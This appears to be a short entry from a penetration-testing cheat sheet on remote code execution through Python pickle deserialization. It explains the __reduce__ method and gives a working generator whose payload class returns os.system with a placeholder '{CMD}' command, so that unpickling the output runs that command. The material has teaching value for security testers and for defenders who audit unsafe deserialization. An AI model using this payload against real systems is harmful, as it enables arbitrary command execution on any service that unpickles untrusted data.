# Python


## RCE deserialization using Pickle

You can execute code during the deserialization process. You need to create
an object with a [`__reduce__`](https://docs.python.org/3.6/library/pickle.html#object.__reduce__) method.
This method should return a tuple of elements :
- The first being a callable
- The others arguments

Here is a function to generate a string:

```python
import pickle

def generate_pickle(cmd):

    class PickleRCE(object):
        def __reduce__(self):
            import os
            return (os.system, (cmd,))

    return pickle.dumps(PickleRCE())

print(generate_pickle('{CMD}'))
```
